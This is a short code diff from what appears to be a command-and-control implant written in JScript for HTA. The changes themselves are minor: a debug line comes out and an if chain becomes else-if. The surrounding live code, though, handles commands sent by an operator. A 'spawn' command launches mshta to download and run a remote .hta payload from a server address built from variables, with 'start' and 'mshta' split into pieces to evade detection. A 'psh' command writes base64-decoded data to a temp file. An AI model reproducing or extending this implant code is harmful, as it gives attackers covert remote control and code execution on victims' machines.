@@ -107,18 +107,17 @@ function main()
 
     if(jsObject.cmnd)
     {
-      runner.Run("msg * "+jsObject.cmnd)
 	    //kill
 	    if(jsObject.cmnd == "quit") {
 		    window.close()
 	    }
 
-	    if(jsObject.cmnd == "spawn") {
+	    else if(jsObject.cmnd == "spawn") {
         runner.Run(cs +" /q /c "+"sta"+"rt /b msh"  + "ta "+proto+ho+me+":"+p0rt+"/"+id+"/r/b.hta", 0, true)
 		    retval = "[+] Spawn success..."
 	    }
 
-      if(jsObject.cmnd.split(" ")[0] == "psh") {
+      else if(jsObject.cmnd.split(" ")[0] == "psh") {
         fd = fso.CreateTextFile(temp + "\\" + id + ".txt")
         msb = jsObject.cmnd.split(" ")[1]
         msbdata = b64d(jsObject.cmnd.split(" ")[2])
